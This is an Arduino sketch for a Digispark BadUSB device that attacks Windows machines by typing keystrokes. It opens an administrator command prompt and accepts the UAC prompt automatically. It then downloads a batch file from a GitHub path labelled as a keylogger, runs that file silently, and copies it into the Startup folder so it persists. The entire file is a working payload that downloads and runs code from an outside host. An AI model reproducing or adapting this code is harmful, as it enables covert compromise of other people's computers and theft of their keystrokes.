#include "DigiKeyboard.h"

#define LED_PIN 1  // Onboard LED pin for status indication

void setup() {
  pinMode(LED_PIN, OUTPUT);  // Set LED pin as output
  DigiKeyboard.delay(1000);  // Initial delay for device recognition
  blinkLED(2, 200);          // 2 quick blinks to indicate startup
}

void loop() {
  // Open Run dialog (Win+R)
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(300);
  
  // Type CMD and run as administrator (Ctrl+Shift+Enter)
  DigiKeyboard.print("cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
  DigiKeyboard.delay(2000);  // Wait for UAC prompt
  
  // Accept UAC prompt (left arrow then Enter)
  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(2000);  // Wait for CMD to open

  // Download file using curl 
  DigiKeyboard.print("curl -o \"%TEMP%\\run.bat\" \"https://raw.githubusercontent.com/0xAbolfazl/BadUSB/refs/heads/master/Digispark/KeyLogger/UsingWebServer/run.bat\" --silent");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(3000);  // Wait for download to complete

  // Execute the downloaded file
  DigiKeyboard.print("\"%TEMP%\\run.bat\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  // Copy to startup folder for persistence 
  DigiKeyboard.print("copy \"%TEMP%\\run.bat\" \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  // Exit command prompt
  DigiKeyboard.print("exit");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);

  // Indicate completion with continuous blinking
  while(1) {
    blinkLED(1, 1000);  // Slow blink indicates success
  }
}

// Helper function for LED blinking
void blinkLED(int times, int duration) {
  for(int i=0; i<times; i++) {
    digitalWrite(LED_PIN, HIGH);
    delay(duration/2);
    digitalWrite(LED_PIN, LOW);
    delay(duration/2);
  }
}